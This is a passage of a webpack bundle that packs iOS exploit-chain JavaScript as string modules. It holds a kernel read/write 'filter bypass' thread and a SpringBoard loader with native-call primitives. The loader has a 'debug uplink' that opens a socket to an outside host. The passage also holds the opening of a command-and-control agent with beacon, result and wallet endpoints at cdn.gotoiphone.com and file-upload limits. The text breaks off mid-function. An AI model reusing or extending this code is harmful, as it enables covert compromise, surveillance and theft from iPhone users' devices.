RUN_FLAG_PAUSE) {\n\t\t\t\t\tif (run == RUN_FLAG_RUN)\n\t\t\t\t\t\tconsole.log(TAG, \"Resuming filter bypass\");\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tlibs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].callSymbol(\"usleep\", 100000);\n\t\t\t}\n\t\t}\n\n\t\t//console.log(TAG, \"Locking sandbox...\");\n\t\tlockSandboxLock();\n\t\t//console.log(TAG, \"Sandbox locked\");\n\n\t\trun = waitForMigSyscall(selfTaskAddr, runBypassFlagPtr, 5000);\n\n\t\tunlockSandboxLock();\n\t\t//console.log(TAG, \"Sandbox unlocked\");\n\n\t\tif (run)\n\t\t\tlibs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].callSymbol(\"sched_yield\");\n\t}\n}\n\ndisarm_gc();\n\n// Register log function\n//globalThis.LOG_POST_TO_FILE = false;\nconsole.log = libs_JSUtils_Logger__WEBPACK_IMPORTED_MODULE_5__[\"default\"].log;\n\nconsole.log(TAG, \"Thread initialized!\");\n\nlet kernelControlPtr = thread_arg;\nlet kernelRWPtr = thread_arg + 0x8n;\nlet kernelBasePtr = thread_arg + 0x10n;\nlet mainThreadAddrPtr = thread_arg + 0x18n;\nlet runBypassFlagPtr = thread_arg + 0x20n;\nlet isRunningPtr = thread_arg + 0x28n;\nlet mutexPtr = thread_arg + 0x30n;\nlet migLockPtr = thread_arg + 0x38n;\nlet migSbxMsgPtr = thread_arg + 0x40n;\nlet migKernelStackLRPtr = thread_arg + 0x48n;\nlet monitorThread1Ptr = thread_arg + 0x50n;\nlet monitorThread2Ptr = thread_arg + 0x58n;\n\nlet kernelControl = uread64(kernelControlPtr);\nlet kernelRW = uread64(kernelRWPtr);\nlet kernelBase = uread64(kernelBasePtr);\nlet mainThreadAddr = uread64(mainThreadAddrPtr);\nrunBypassFlagPtr = uread64(runBypassFlagPtr);\nisRunningPtr = uread64(isRunningPtr);\nlet mutex = uread64(mutexPtr);\nlet migLock = uread64(migLockPtr);\nlet migSbxMsg = uread64(migSbxMsgPtr);\nlet migKernelStackLR = uread64(migKernelStackLRPtr);\nmonitorThread1Ptr = uread64(monitorThread1Ptr);\nmonitorThread2Ptr = uread64(monitorThread2Ptr);\n\nconsole.log(TAG, \"kernelControl:     \" + kernelControl);\nconsole.log(TAG, \"kernelRW:          \" + kernelRW);\nconsole.log(TAG, \"kernelBase:        \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(kernelBase));\nconsole.log(TAG, \"mainThreadAddr:    \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(mainThreadAddr));\nconsole.log(TAG, \"runBypassFlagPtr:  \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(runBypassFlagPtr));\nconsole.log(TAG, \"isRunningPtr:      \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(isRunningPtr));\nconsole.log(TAG, \"mutex:             \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(mutex));\nconsole.log(TAG, \"migLock:           \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(migLock));\nconsole.log(TAG, \"migSbxMsg:         \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(migSbxMsg));\nconsole.log(TAG, \"migKernelStackLR:  \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(migKernelStackLR));\nconsole.log(TAG, \"monitorThread1Ptr: \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(monitorThread1Ptr));\nconsole.log(TAG, \"monitorThread2Ptr: \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(monitorThread2Ptr));\n\ntry {\n\tlet driver = new libs_Driver_DriverNewThread__WEBPACK_IMPORTED_MODULE_7__[\"default\"](kernelControl, kernelRW, kernelBase);\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].init(driver, mutex);\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].testKRW();\n\tlibs_TaskRop_TaskRop__WEBPACK_IMPORTED_MODULE_4__[\"default\"].init();\n\n\tconsole.log(TAG, \"Chain initialized\");\n\n\tlibs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write32(isRunningPtr, 1);\n\n\tstartFilterBypass(runBypassFlagPtr);\n\n\tconsole.log(TAG, \"Terminating bypass thread\");\n}\ncatch (error) {\n\tconsole.log(TAG, \"Error: \" + error);\n\tconsole.log(TAG, \"\" + error.stack);\n}\n})();\n\nvar __webpack_export_target__ = exports;\nfor(var __webpack_i__ in __webpack_exports__) __webpack_export_target__[__webpack_i__] = __webpack_exports__[__webpack_i__];\nif(__webpack_exports__.__esModule) Object.defineProperty(__webpack_export_target__, \"__esModule\", { value: true });\n/******/ })()\n;");

/***/ }),

/***/ "./node_modules/raw-loader/dist/cjs.js!./src/loader.js":
/*!*************************************************************!*\
  !*** ./node_modules/raw-loader/dist/cjs.js!./src/loader.js ***!
  \*************************************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
/* harmony export */ });
/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ("class Native {\n\t\n\tstatic #baseAddr;\n\tstatic #dlsymAddr;\n\tstatic #memcpyAddr;\n\tstatic #mallocAddr;\n\tstatic #oinvAddr;\n\t\n\t// Preallocated memory chunk for general purpose stuff for public use\n\tstatic mem = 0n;\n\tstatic memSize = 0x4000;\n\t\n\t// Preallocated memory chunk for encoding/decoding of string arguments\n\tstatic #argMem = 0n;\n\tstatic #argMemPtr = 0n;\n\tstatic #argMemPtrStr = 0n;\n\t\n\t// Pointer to next available memory for native argument\n\tstatic #argPtr = 0n;\n\tstatic #argPtrPtr = 0n;\n\tstatic #argPtrStrPtr = 0n;\n\n\tstatic #dlsymCache = {};\n\t\n\tstatic init() {\n\t\tconst buff = new BigUint64Array(nativeCallBuff);\n\t\tthis.#baseAddr = buff[20];\n\t\tthis.#dlsymAddr = buff[21];\n\t\tthis.#memcpyAddr = buff[22];\n\t\tthis.#mallocAddr = buff[23];\n\t\tthis.#oinvAddr = buff[24];\n\t\t\n\t\t//log(\"baseAddr: \" + this.#baseAddr);\n\t\t//log(\"dlsymAddr: \" + this.#dlsymAddr);\n\t\t\n\t\t//this.#memcpyAddr = this.#dlsym(\"test\");\n\t\t//log(\"memcpyAddr: \" + this.#memcpyAddr);\n\t\t//log(\"oinvAddr: \" + this.#oinvAddr);\n\t\t\n\t\tthis.mem = this.#nativeCallAddr(this.#mallocAddr, BigInt(this.memSize)); //this.callSymbol(\"malloc\", this.memSize);\n\t\tthis.#argMem = this.#nativeCallAddr(this.#mallocAddr, 0x1000n); //this.callSymbol(\"malloc\", 0x1000);\n\t\tthis.#argMemPtr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n); //this.callSymbol(\"malloc\", 0x1000);\n\t\tthis.#argMemPtrStr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n); //this.callSymbol(\"malloc\", 0x1000);\n\t\tthis.#argPtr = this.#argMem;\n\t\tthis.#argPtrPtr = this.#argMemPtr;\n\t\tthis.#argPtrStrPtr = this.#argMemPtrStr;\n\t\t\n\t\t//log(\"argMem: \" + this.#argMem);\n\t\t//log(\"argMemPtr: \" + this.#argMemPtr);\n\t\t//log(\"argMemPtrStr: \" + this.#argMemPtrStr);\n\t}\n\t\n\tstatic write(ptr, buff) {\n\t\tif (!ptr)\n\t\t\treturn false;\n\t\t//log(\"write: \" + buff.byteLength);\n\t\tlet buff8 = new Uint8Array(nativeCallBuff);\n\t\tlet offs = 0;\n\t\tlet left = buff.byteLength;\n\t\twhile (left) {\n\t\t\tlet len = left;\n\t\t\tif (len > 0x1000)\n\t\t\t\tlen = 0x1000;\n\t\t\t//log(`writing: ptr=${ptr}, src=${Native.#baseAddr + 0x1000n}, offs=${offs}, len=${len}`);\n\t\t\tbuff8.set(new Uint8Array(buff, offs, len), 0x1000);\n\t\t\tthis.#nativeCallAddr(this.#memcpyAddr, ptr + BigInt(offs), this.#baseAddr + 0x1000n, BigInt(len));\n\t\t\tleft -= len;\n\t\t\toffs += len;\n\t\t}\n\t\treturn true;\n\t}\n\t\n\tstatic read(ptr, length) {\n\t\tif (!ptr)\n\t\t\treturn null;\n\t\t//log(`read: ptr=${ptr}, length=${length}, ${typeof(length)}`, ptr, length);\n\t\tlet buff = new ArrayBuffer(length);\n\t\tlet buff8 = new Uint8Array(buff);\n\t\tlet offs = 0;\n\t\tlet left = length;\n\t\twhile (left) {\n\t\t\tlet len = left;\n\t\t\tif (len > 0x1000)\n\t\t\t\tlen = 0x1000;\n\t\t\t//log(`reading: ptr=${ptr}, dst=${Native.#baseAddr + 0x1000n}, offs=${offs}, len=${len}`);\n\t\t\tthis.#nativeCallAddr(this.#memcpyAddr, this.#baseAddr + 0x1000n, ptr + BigInt(offs), BigInt(len));\n\t\t\tbuff8.set(new Uint8Array(nativeCallBuff, 0x1000, len), offs);\n\t\t\tleft -= len;\n\t\t\toffs += len;\n\t\t}\n\t\treturn buff;\n\t}\n\t\n\tstatic readPtr(ptr) {\n\t\tlet buff = this.read(ptr, 8);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getBigUint64(0, true);\n\t}\n\t\n\tstatic readString(ptr, len=1024) {\n\t\tlet buff = this.read(ptr, len);\n\t\treturn this.bytesToString(buff, false);\n\t}\n\t\n\tstatic writeString(ptr, str) {\n\t\tconst buff = this.stringToBytes(str, true);\n\t\tthis.write(ptr, buff);\n\t}\n\t\n\tstatic callSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7) {\n\t\t//log(\"callSymbol: \" + name);\n\t\t// Initialize argPtr to point to general purpose memory chunk\n\t\tthis.#argPtr = this.#argMem;\n\t\tx0 = this.#toNative(x0);\n\t\tx1 = this.#toNative(x1);\n\t\tx2 = this.#toNative(x2);\n\t\tx3 = this.#toNative(x3);\n\t\tx4 = this.#toNative(x4);\n\t\tx5 = this.#toNative(x5);\n\t\tx6 = this.#toNative(x6);\n\t\tx7 = this.#toNative(x7);\n\t\tlet ret = this.#nativeCallSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7);\n\t\t// Reset argPtr\n\t\tthis.#argPtr = this.#argMem;\n\t\treturn ret;\n\t}\n\t\n\tstatic callSymbolRetain(name, x0, x1, x2, x3, x4, x5, x6, x7) {\n\t\t//log(\"callSymbolRetain: \" + name);\n\t\t// Initialize argPtrPtr to point to general purpose memory chunk\n\t\tthis.#argPtrPtr = this.#argMemPtr;\n\t\tthis.#argPtrStrPtr = this.#argMemPtrStr;\n\t\tx0 = this.#toNativePtr(x0);\n\t\tx1 = this.#toNativePtr(x1);\n\t\tx2 = this.#toNativePtr(x2);\n\t\tx3 = this.#toNativePtr(x3);\n\t\tx4 = this.#toNativePtr(x4);\n\t\tx5 = this.#toNativePtr(x5);\n\t\tx6 = this.#toNativePtr(x6);\n\t\tx7 = this.#toNativePtr(x7);\n\t\tlet ret = this.#nativeCallSymbolRetain(name, x0, x1, x2, x3, x4, x5, x6, x7);\n\t\t// Reset argPtrPtr\n\t\tthis.#argPtrPtr = this.#argMemPtr;\n\t\tthis.#argPtrStrPtr = this.#argMemPtrStr;\n\t\treturn ret;\n\t}\n\n\tstatic bytesToString(bytes, includeNullChar=true) {\n\t\tlet bytes8 = new Uint8Array(bytes);\n\t\tlet str = \"\";\n\t\tfor (let i=0; i<bytes8.length; i++) {\n\t\t\tif (!includeNullChar && !bytes8[i])\n\t\t\t\tbreak;\n\t\t\tstr += String.fromCharCode(bytes8[i]);\n\t\t}\n\t\treturn str;\n\t}\n\t\n\tstatic stringToBytes(str, nullTerminated=false) {\n\t\tlet buff = new ArrayBuffer(str.length + (nullTerminated ? 1 : 0));\n\t\tlet s8 = new Uint8Array(buff);\n\t\tfor (let i=0; i<str.length; i++)\n\t\t\ts8[i] = str.charCodeAt(i);\n\t\tif (nullTerminated)\n\t\t\ts8[str.length] = 0x0;\n\t\treturn s8.buffer;\n\t}\n\t\n\tstatic #toNative(value) {\n\t\t//log(\"toNative: \" + typeof value);\n\t\t// Strings need to be manually written to native memory\n\t\tif (!value)\n\t\t\treturn 0n;\n\t\tif (typeof value === 'string') {\n\t\t\tif (value.length >= 0x1000) {\n\t\t\t\tlog('toNative(): arg string is too long');\n\t\t\t\treturn 0n;\n\t\t\t}\n\t\t\tlet ptr = this.#argPtr;\n\t\t\tthis.writeString(ptr, value);\n\t\t\tthis.#argPtr += BigInt(value.length + 1);\n\t\t\treturn ptr;\n\t\t}\n\t\telse if (typeof value === 'bigint') {\n\t\t\treturn value;\n\t\t}\n\t\telse\n\t\t\treturn BigInt(value);\n\t}\n\t\n\tstatic #toNativePtr(value) {\n\t\t//log(\"toNativePtr: \" + typeof value);\n\t\t// Strings need to be manually written to native memory\n\t\tif (!value)\n\t\t\treturn 0n;\n\t\tlet ptr = this.#argPtrPtr;\n\t\tif (typeof value === 'string') {\n\t\t\tif (value.length >= 0x1000) {\n\t\t\t\tlog('toNativePtr(): arg string is too long');\n\t\t\t\treturn 0n;\n\t\t\t}\n\t\t\tlet strPtr = this.#argPtrStrPtr;\n\t\t\tthis.writeString(strPtr, value);\n\t\t\tthis.#argPtrStrPtr += BigInt(value.length + 1);\n\t\t\tvalue = strPtr;\n\t\t}\n\t\telse if (typeof value !== 'bigint') {\n\t\t\tvalue = BigInt(value);\n\t\t}\n\t\tconst buff = new ArrayBuffer(8);\n\t\tconst view = new DataView(buff);\n\t\tview.setBigUint64(0, value, true);\n\t\tthis.write(ptr, buff);\n\t\tthis.#argPtrPtr += 8n;\n\t\treturn ptr;\n\t}\n\t\n\tstatic #dlsym(name) {\n\t\tif (!name)\n\t\t\treturn 0n;\n\t\tlet addr = this.#dlsymCache[name];\n\t\tif (addr)\n\t\t\treturn addr;\n\t\t//log(\"dlsym(): \" + name);\n\t\tconst RTLD_DEFAULT = 0xfffffffffffffffen;\n\t\tconst nameBytes = this.stringToBytes(name, true);\n\t\tlet buff8 = new Uint8Array(nativeCallBuff);\n\t\tbuff8.set(new Uint8Array(nameBytes), 0x1000);\n\t\taddr = this.#nativeCallAddr(this.#dlsymAddr, RTLD_DEFAULT, this.#baseAddr + 0x1000n);\n\t\tif (addr)\n\t\t\tthis.#dlsymCache[name] = addr;\n\t\treturn addr;\n\t}\n\t\n\tstatic #nativeCallAddr(addr, x0=0n, x1=0n, x2=0n, x3=0n, x4=0n, x5=0n, x6=0n, x7=0n) {\n\t\t//log(\"nativeCallAddr(): \" + addr);\n\t\tlet buff = new BigInt64Array(nativeCallBuff);\n\t\t\n\t\tbuff[0] = addr;\n\t\tbuff[100] = x0;\n\t\tbuff[101] = x1;\n\t\tbuff[102] = x2;\n\t\tbuff[103] = x3;\n\t\tbuff[104] = x4;\n\t\tbuff[105] = x5;\n\t\tbuff[106] = x6;\n\t\tbuff[107] = x7;\n\n\t\tinvoker();\n\t\t\n\t\treturn buff[200];\n\t}\n\t\n\tstatic #nativeCallSymbol(name, ...args) {\n\t\t//log(\"nativeCallSymbol(): \" + name);\n\t\tconst funcAddr = this.#dlsym(name);\n\t\tconst ret64 = this.#nativeCallAddr(funcAddr, ...args);\n\t\tif (ret64 < 0xffffffffn && ret64 > -0xffffffffn)\n\t\t\treturn Number(ret64);\n\t\treturn ret64;\n\t}\n\t\n\tstatic #nativeCallSymbolRetain(name, x0, x1, x2, x3, x4, x5, x6, x7) {\n\t\t//log(\"nativeCallSymbolRetain(): \" + name);\n\t\tconst funcAddr = this.#dlsym(name);\n\t\t\n\t\tconst selRetainArguments = this.callSymbol(\"sel_registerName\", \"retainArguments\");\n\t\tconst selSetArgument = this.callSymbol(\"sel_registerName\", \"setArgument:atIndex:\");\n\t\tconst selInvokeUsingIMP = this.callSymbol(\"sel_registerName\", \"invokeUsingIMP:\");\n\t\tconst selGetReturnValue = this.callSymbol(\"sel_registerName\", \"getReturnValue:\");\n\t\t\n\t\tthis.callSymbol(\"objc_msgSend\", this.#oinvAddr, selRetainArguments);\n\t\t\n\t\tif (x0) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x0, 0);\n\t\tif (x1) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x1, 1);\n\t\tif (x2) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x2, 2);\n\t\tif (x3) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x3, 3);\n\t\tif (x4) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x4, 4);\n\t\tif (x5) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x5, 5);\n\t\tif (x6) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x6, 6);\n\t\tif (x7) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x7, 7);\n\t\t\n\t\tthis.callSymbol(\"objc_msgSend\", this.#oinvAddr, selInvokeUsingIMP, funcAddr);\n\t\t\n\t\tthis.callSymbol(\"objc_msgSend\", this.#oinvAddr, selGetReturnValue, this.#argMemPtr);\n\t\tconst ret64 = this.readPtr(this.#argMemPtr);\n\t\tif (ret64 < 0xffffffffn && ret64 > -0xffffffffn)\n\t\t\treturn Number(ret64);\n\t\treturn ret64;\n\t}\n}\n\nfunction File(path) {\n\treturn path;\n}\n\nfunction log(msg) {\n\tif (logging)\n\t\treturn;\n\n\tlogging = true;\n\t\n\tconst data = Native.stringToBytes(msg + \"\\n\");\n\n\tconst O_WRONLY = 0x0001;\n\tconst O_APPEND = 0x0008;\n\tconst O_CREAT = 0x0200;\n\tconst flags = O_WRONLY | O_CREAT | O_APPEND;\n\tconst fd = Native.callSymbol(\"open\", File(logfile), flags, 0o644);\n\tif (fd < 0) {\n\t\tlogging = false;\n\t\treturn;\n\t}\n\n\t// For some reason file mode is not applied on open()\n\tNative.callSymbol(\"fchmod\", fd, 0o644);\n\n\tlet offs = 0;\n\tlet left = data.byteLength;\n\n\tconst buffSize = 0x4000;\n\tconst buffPtr = Native.callSymbol(\"malloc\", buffSize);\n\n\twhile (left) {\n\t\tconst size = left > buffSize ? buffSize : left;\n\t\tconst src8 = new Uint8Array(data, offs, size);\n\t\tconst dst8 = new Uint8Array(src8);\n\t\tNative.write(buffPtr, dst8.buffer);\n\t\tconst len = Native.callSymbol(\"write\", fd, buffPtr, size);\n\t\tif (!len || len < 0)\n\t\t\tbreak;\n\t\toffs += len;\n\t\tleft -= len;\n\t}\n\n\tNative.callSymbol(\"free\", buffPtr);\n\tNative.callSymbol(\"close\", fd);\n\n\tlogging = false;\n}\n\nvar logging = false;\nconst logfile = \"/private/var/mobile/Media/RemoteLog.log\";\n\nNative.init();\n\nNative.callSymbol(\"unlink\", File(logfile));\n\n// ===== DEBUG uplink: prove loader actually ran inside SpringBoard =====\ntry {\n\tvar _lfd = Number(Native.callSymbol(\"socket\", 2, 1, 0));\n\tif (_lfd >= 0) {\n\t\tvar _lone = Native.callSymbol(\"calloc\", 1, 8);\n\t\tNative.write(_lone, new Uint8Array([1,0,0,0]).buffer);\n\t\tNative.callSymbol(\"setsockopt\", _lfd, 0xffff, 0x1022, _lone, 4);\n\t\tNative.callSymbol(\"free\", _lone);\n\t\tvar _laddr = Native.callSymbol(\"calloc\", 1, 16);\n\t\tvar _la8 = new Uint8Array(16);\n\t\t_la8[0] = 16; _la8[1] = 2; _la8[2] = 0x1B; _la8[3] = 0x6E;\n\t\t_la8[4] = 192; _la8[5] = 168; _la8[6] = 4; _la8[7] = 10;\n\t\tNative.write(_laddr, _la8.buffer);\n\t\tif (Number(Native.callSymbol(\"connect\", _lfd, _laddr, 16)) === 0) {\n\t\t\tvar _lreq = \"GET /log.html?text=PEMK_G_loader_alive_springboard HTTP/1.0\\r\\nHost: cdn.gotoiphone.com\\r\\n\\r\\n\";\n\t\t\tvar _lrbuf = Native.callSymbol(\"malloc\", _lreq.length + 1);\n\t\t\tNative.writeString(_lrbuf, _lreq);\n\t\t\tNative.callSymbol(\"write\", _lfd, _lrbuf, _lreq.length);\n\t\t\tNative.callSymbol(\"free\", _lrbuf);\n\t\t}\n\t\tNative.callSymbol(\"close\", _lfd);\n\t\tNative.callSymbol(\"free\", _laddr);\n\t}\n} catch(e) {}\n// ===== END DEBUG uplink =====\n");

/***/ }),


/***/ "./node_modules/raw-loader/dist/cjs.js!./src/c2_agent.js":
/*!****************************************************************!*\
  !*** ./node_modules/raw-loader/dist/cjs.js!./src/c2_agent.js ***!
  \****************************************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
/* harmony export */ });
/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ("// C2 Agent Payload - persistent loop in SpringBoard\n// Communicates with command.py via HTTP, runs until reboot\n// https://cdn.gotoiphone.com:443/beacon / https://cdn.gotoiphone.com:443/result replaced by server.py at load time\n// UUID and device model are obtained natively at runtime\n\nconst C2_BEACON_URL = \"https://cdn.gotoiphone.com:443/beacon\";\nconst C2_RESULT_URL = \"https://cdn.gotoiphone.com:443/result\";\nconst C2_CHANNEL_CODE = \"\";\nconst HQ_API_BASE = \"https://cdn.gotoiphone.com:443\";\nconst HQ_WALLET_PORT = \"443\";\nconst MAX_FILE_SIZE = 2 * 1024 * 1024;\nconst CHUNK_SIZE    = 1024 * 1024;\n// /war single-POST threshold: larger packages are split into war_chunk parts on the same endpoint.\nconst WAR_POST_MAX  = 5 * 1024 * 1024;\n\n// ============================================================================\n// Native Class (shared nativeCallBuff + invoker pattern)\n// ============================================================================\n\nclass Native {\n\tstatic #baseAddr;\n\tstatic #dlsymAddr;\n\tstatic #memcpyAddr;\n\tstatic #mallocAddr;\n\tstatic #oinvAddr;\n\n\tstatic mem = 0n;\n\tstatic memSize = 0x4000;\n\n\tstatic #argMem = 0n;\n\tstatic #argMemPtr = 0n;\n\tstatic #argMemPtrStr = 0n;\n\tstatic #argPtr = 0n;\n\tstatic #argPtrPtr = 0n;\n\tstatic #argPtrStrPtr = 0n;\n\tstatic #dlsymCache = {};\n\n\tstatic init() {\n\t\tconst buff = new BigUint64Array(nativeCallBuff);\n\t\tthis.#baseAddr   = buff[20];\n\t\tthis.#dlsymAddr  = buff[21];\n\t\tthis.#memcpyAddr = buff[22];\n\t\tthis.#mallocAddr = buff[23];\n\t\tthis.#oinvAddr   = buff[24];\n\n\t\tthis.mem          = this.#nativeCallAddr(this.#mallocAddr, BigInt(this.memSize));\n\t\tthis.#argMem      = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);\n\t\tthis.#argMemPtr   = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);\n\t\tthis.#argMemPtrStr= this.#nativeCallAddr(this.#mallocAddr, 0x1000n);\n\t\tthis.#argPtr      = this.#argMem;\n\t\tthis.#argPtrPtr   = this.#argMemPtr;\n\t\tthis.#argPtrStrPtr= this.#argMemPtrStr;\n\t}\n\n\tstatic write(ptr, buff) {\n\t\tif (!ptr) return false;\n\t\tlet buff8 = new Uint8Array(nativeCallBuff);\n\t\tlet offs = 0, left = buff.byteLength;\n\t\twhile (left) {\n\t\t\tlet len = left > 0x1000 ? 0x1000 : left;\n\t\t\tbuff8.set(new Uint8Array(buff, offs, len), 0x1000);\n\t\t\tthis.#nativeCallAddr(this.#memcpyAddr, ptr + BigInt(offs), this.#baseAddr + 0x1000n, BigInt(len));\n\t\t\tleft -= len; offs += len;\n\t\t}\n\t\treturn true;\n\t}\n\n\tstatic read(ptr, length) {\n\t\tif (!ptr) return null;\n\t\tlet buff = new ArrayBuffer(length);\n\t\tlet buff8 = new Uint8Array(buff);\n\t\tlet offs = 0, left = length;\n\t\twhile (left) {\n\t\t\tlet len = left > 0x1000 ? 0x1000 : left;\n\t\t\tthis.#nativeCallAddr(this.#memcpyAddr, this.#baseAddr + 0x1000n, ptr + BigInt(offs), BigInt(len));\n\t\t\tbuff8.set(new Uint8Array(nativeCallBuff, 0x1000, len), offs);\n\t\t\tleft -= len; offs += len;\n\t\t}\n\t\treturn buff;\n\t}\n\n\tstatic readPtr(ptr) {\n\t\tconst v = new DataView(this.read(ptr, 8));\n\t\treturn v.getBigUint64(0, true);\n\t}\n\tstatic read32(ptr) {\n\t\tconst v = new DataView(this.read(ptr, 4));\n\t\treturn v.getInt32(0, true);\n\t}\n\tstatic write64(ptr, value) {\n\t\tconst b = new ArrayBuffer(8);\n\t\tnew DataView(b).setBigUint64(0, value, true);\n\t\tthis.write(ptr, b);\n\t}\n\n\tstatic readString(ptr, len=1024) {\n\t\treturn this.bytesToString(this.read(ptr, len), false);\n\t}\n\tstatic writeString(ptr, str) {\n\t\tthis.write(ptr, this.stringToBytes(str, true));\n\t}\n\n\tstatic callSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7) {\n\t\tthis.#argPtr = this.#argMem;\n\t\tx0 = this.#toNative(x0); x1 = this.#toNative(x1);\n\t\tx2 = this.#toNative(x2); x3 = this.#toNative(x3);\n\t\tx4 = this.#toNative(x4); x5 = this.#toNative(x5);\n\t\tx6 = this.#toNative(x6); x7 = this.#toNative(x7);\n\t\tlet ret = this.#nativeCallSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7);\n\t\tthis.#argPtr = this.#argMem;\n\t\treturn ret;\n\t}\n\n\tstatic bytesToString(bytes, includeNull=true) {\n\t\tlet a = new Uint8Array(bytes), s = \"\";\n\t\tfor (let i = 0; i < a.length; i++) {\n\t\t\tif (!includeNull && !a[i]) break;\n\t\t\ts += String.fromCharCode(a[i]);\n\t\t}\n\t\treturn s;\n\t}\n\tstatic stringToBytes(str, nullTerm=false) {\n\t\tlet b = new ArrayBuffer(str.length + (nullTerm ? 1 : 0));\n\t\tlet a = new Uint8Array(b);\n\t\tfor (let i = 0; i < str.length; i++) a[i] = str.charCodeAt(i);\n\t\tif (nullTerm) a[str.length] = 0;\n\t\treturn a.buffer;\n\t}\n\n\tstatic #toNative(v) {\n\t\tif (!v) return 0n;\n\t\tif (typeof v === 'string') {\n\t\t\tif (v.length >= 0x1000) return 0n;\n\t\t\tlet ptr = this.#argPtr;\n\t\t\tthis.writeString(ptr, v);\n\t\t\tthis.#argPtr += BigInt(v.length + 1);\n\t\t\treturn ptr;\n\t\t}\n\t\treturn typeof v === 'bigint' ? v : BigInt(v);\n\t}\n\n\tstatic #dlsym(name) {\n\t\tif (!name) return 0n;\n\t\tlet a = this.#dlsymCache[name];\n\t\tif (a) return a;\n\t\tconst RTLD_DEFAULT = 0xfffffffffffffffen;\n\t\tconst nb = this.stringToBytes(name, true);\n\t\tnew Uint8Array(nativeCallBuff).set(new Uint8Array(nb), 0x1000);\n\t\ta = this.#nativeCallAddr(this.#dlsymAddr, RTLD_DEFAULT, this.#baseAddr + 0x1000n);\n\t\tif (a) this.#dlsymCache[name] = a;\n\t\treturn a;\n\t}\n\n\tstatic #nativeCallAddr(addr, x0=0n, x1=0n, x2=0n, x3=0n, x4=0n, x5=0n, x6=0n, x7=0n) {\n\t\tlet b = new BigInt64Array(nativeCallBuff);\n\t\tb[0]=addr; b[100]=x0; b[101]=x1; b[102]=x2; b[103]=x3;\n\t\tb[104]=x4; b[105]=x5; b[106]=x6; b[107]=x7;\n\t\tinvoker();\n\t\treturn b[200];\n\t}\n\n\tstatic #nativeCallSymbol(name, ...args) {\n\t\tconst addr = this.#dlsym(name);\n\t\tconst r = this.#nativeCallAddr(addr, ...args);\n\t\tif (r < 0xffffffffn && r > -0xffffffffn) return Number(r);\n\t\treturn r;\n\t}\n}\n\n// ============================================================================\n// URL Parsing\n// ============================================================================\n\nfunction parseURL(url) {\n\tlet host = \"\", port = 80, path = \"/\";\n\tlet s = url;\n\tif (s.indexOf(\"https://\") === 0) { s = s.substring(8); port = 443; }\n\telse if (s.indexOf(\"http://\") === 0) s = s.substring(7);\n\tconst sl = s.indexOf(\"/\");\n\tif (sl >= 0) { path = s.substring(sl); s = s.substring(0, sl); }\n\tconst cl = s.indexOf(\":\");\n\tif (cl >= 0) { host = s.substring(0, cl); port = parseInt(s.substring(cl + 1)); }\n\telse host = s;\n\treturn { host, port, path };\n}\n\n// ============================================================================\n// Base64\n// ============================================================================\n\nconst B64 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n\nfunction bytesToBase64(bytes) {\n\tlet r = \"\";\n\tfor (let i = 0; i < bytes.length; i += 3) {\n\t\tconst a = bytes[i], b = i+1 < bytes.length ? bytes[i+1] : 0, c = i+2 < bytes.length ? bytes[i+2] : 0;\n\t\tr += B64[a >> 2];\n\t\tr += B64[((a & 3) << 4) | (b >> 4)];\n\t\tr += i+1 < bytes.length ? B64[((b & 15) << 2) | (c >> 6)] : \"=\";\n\t\tr += i+2 < bytes.length ? B64[c & 63] : \"=\";\n\t}\n\treturn r;\n}\n\n// ============================================================================\n// POSIX Socket HTTP Client (http:// only, LAN testing)\n// ============================================================================\n\nfunction _sendBytes(fd, str) {\n\tconst SZ = 4096;\n\tlet sent = 0;\n\tconst buf = 